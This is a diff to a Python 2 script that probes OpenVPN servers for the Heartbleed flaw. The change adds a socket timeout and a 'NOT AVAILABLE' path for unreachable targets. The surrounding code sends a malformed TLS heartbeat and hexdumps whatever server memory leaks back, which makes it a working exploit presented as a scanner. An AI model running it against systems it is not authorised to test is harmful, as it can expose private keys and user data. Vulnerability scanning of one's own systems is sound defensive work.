@@ -154,57 +154,61 @@ def main():
     target = args[0]
 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(2)
     sys.stdout.flush()
     s.connect((target, opts.port))
     sys.stdout.flush()
 
-    s.send(struct.pack('>bqbi', 0x38, lsesseionid, 0, packetid))
-    packetid += 1
-
-    typ, sessionid, packarrlen, packid, payload = handle_message(s)
-
-    send_message(s, hello_openvpn)
-
-    while True:
+    try:
+        s.send(struct.pack('>bqbi', 0x38, lsesseionid, 0, packetid))
+        packetid += 1
+    
         typ, sessionid, packarrlen, packid, payload = handle_message(s)
-
-        # Look for server hello done message.
-        if typ == 0x20 and len(payload) < 100:
-            break
-
-        if typ == None:
-            print "Hello message failed"
-            return
-
-    hb_length = 0x1000
-    hb = msg_tls_heartbeat_request("Heartbleed test payload", hb_length)
-    send_message(s, hb)
-
-    hb_received = False
-    heartbleed = ""
-    other = 0
-
-    # Heartbeat delivered, if vulnerable, we receive data...
-    while True:
-        typ, sessionid, packarrlen, packid, payload = handle_message(s)
-
-        if typ == 0x20:
-            # Control message, should contain heartbeat answer...
-            heartbleed += payload
-            if not hb_received:
-                # Check HB header early...
-                hb_received = True
-                tlstype, tlsversion, tlslength = msg_tls_heartbeat_header(payload)
-                check_hb(tlstype, tlsversion, tlslength)
-        elif typ == 0x28:
-            # We received ack only, the server ignored our heartbeat
-            print target + '|NOT VULNERABLE (only ACK received)'
-            return
-
-        if len(heartbleed) >= hb_length + 5:
-            break
-
-    print hexdump(heartbleed[0:100], 16)
+    
+        send_message(s, hello_openvpn)
+    
+        while True:
+            typ, sessionid, packarrlen, packid, payload = handle_message(s)
+   
+            # Look for server hello done message.
+            if typ == 0x20 and len(payload) < 100:
+                 break
+    
+            if typ == None:
+                print "Hello message failed"
+                return
+    
+        hb_length = 0x1000
+        hb = msg_tls_heartbeat_request("Heartbleed test payload", hb_length)
+        send_message(s, hb)
+    
+        hb_received = False
+        heartbleed = ""
+        other = 0
+    
+        # Heartbeat delivered, if vulnerable, we receive data...
+        while True:
+            typ, sessionid, packarrlen, packid, payload = handle_message(s)
+    
+            if typ == 0x20:
+                # Control message, should contain heartbeat answer...
+                heartbleed += payload
+                if not hb_received:
+                    # Check HB header early...
+                    hb_received = True
+                    tlstype, tlsversion, tlslength = msg_tls_heartbeat_header(payload)
+                    check_hb(tlstype, tlsversion, tlslength)
+            elif typ == 0x28:
+                # We received ack only, the server ignored our heartbeat
+                print target + '|NOT VULNERABLE (only ACK received)'
+                return
+    
+            if len(heartbleed) >= hb_length + 5:
+                break
+    
+        print hexdump(heartbleed[0:100], 16)
+    except socket.timeout:
+        print target + '|NOT AVAILABLE'
 
 if __name__ == '__main__':
     main()
